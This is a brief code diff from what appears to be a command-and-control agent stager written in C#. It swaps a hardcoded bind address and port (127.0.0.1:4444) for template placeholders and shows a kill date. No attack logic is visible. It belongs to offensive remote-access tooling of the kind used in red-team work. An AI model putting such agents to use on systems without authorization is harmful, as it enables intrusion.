@@ -7,8 +7,8 @@ class AgentStager
 
     static string AgentID;
 
-    static readonly string BindAddress = "127.0.0.1";
-    static readonly int BindPort = 4444;
+    static readonly string BindAddress = "<<BindAddress>>";
+    static readonly int BindPort = int.Parse("<<BindPort>>");
 
     static DateTime KillDate = DateTime.Parse("01/01/2030 00:00:00");
 
